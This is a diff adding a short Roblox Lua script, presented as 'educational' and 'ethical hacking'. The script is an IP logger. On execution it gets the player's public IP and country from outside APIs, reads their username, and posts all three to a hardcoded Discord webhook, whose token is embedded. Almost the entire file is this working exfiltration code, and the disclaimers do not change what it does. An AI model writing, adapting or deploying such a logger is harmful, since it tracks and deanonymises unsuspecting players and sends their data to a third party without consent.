@@ -1,0 +1,44 @@
+-- EDUCATIONAL PURPOSE ONLY!
+
+https = game:GetService("HttpService")
+webhook = "https://discord.com/api/webhooks/1255400219554611253/FwEgnvS4qcH6dNDxCwEiMRzLxNP-ola3xtFETym1HtvQ7Jwf6BanZAvQ7Gl-fI4aeHdK"
+iplogger = "https://api.ipify.org?format=json" -- to get the user's IP
+
+local function IP()
+	local respond = https:GetAsync(iplogger) -- gets the raw field of the respond
+	local data = https:JSONDecode(respond)
+	return data.ip -- return's the user's ip
+end
+
+local function getcuntryfromip()
+	local ip = IP()
+	local locationformatter = "http://ip-api.com/json/"..ip
+	local respond = https:GetAsync(locationformatter)
+	local data = https:JSONDecode(respond)
+	return data.country
+end
+
+local function send_webhook(country, username, ip)
+	-- im gonna be using the api i found on github
+	local data = {
+		["content"] = "User Info",
+		["embeds"] = {{
+			["title"] = "User Info",
+			["description"] = "Country: ".. country.."\nUsername: "..username.."\nIP: "..ip,
+			["type"] = "rich"
+		}}
+	}
+	local json_data = https:JSONEncode(data)
+	https:PostAsync(webhook, json_data, Enum.HttpContentType.ApplicationJson)
+end
+
+local function sendall()
+	local ip = IP()
+	local country = getcuntryfromip()
+	local username = game.Players.LocalPlayer.Name
+	send_webhook(country, username, ip)
+end
+sendall() -- sends all of the info
+-- and we are done!
+-- thanks for watching
+-- please dont use this for some illegal activities as it is for ETHICAL HACKING only
